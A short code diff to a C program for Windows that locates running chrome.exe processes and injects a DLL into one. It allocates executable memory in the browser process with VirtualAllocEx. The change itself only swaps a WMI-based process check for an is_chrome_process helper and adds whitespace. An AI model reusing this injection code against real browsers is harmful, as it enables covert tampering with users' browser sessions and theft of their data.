@@ -3,7 +3,7 @@
 #include "tlhelp32.h"
 #include "tchar.h"
 #include "wchar.h"
-#include "wmi.h"
+#include "chrome.h"
 
 HANDLE findProcess();
 BOOL loadRemoteDLL(HANDLE hProcess);
@@ -63,7 +63,8 @@ HANDLE findProcess()
 
         if (wcscmp(pe32.szExeFile, L"chrome.exe") == 0)
         {
-            if (wmi(pe32.th32ProcessID))
+
+            if (is_chrome_process(pe32.th32ProcessID))
             {
                 wprintf(
                     L"[+] Chrome Browser PID: %lu\n",
@@ -92,6 +93,7 @@ BOOL loadRemoteDLL(HANDLE hProcess)
 
     // Allocate memory for DLL's path name to remote process
     LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
     if (dllPathAddressInRemoteMemory == NULL)
     {
         printf("[---] VirtualAllocEx unsuccessful.\n");
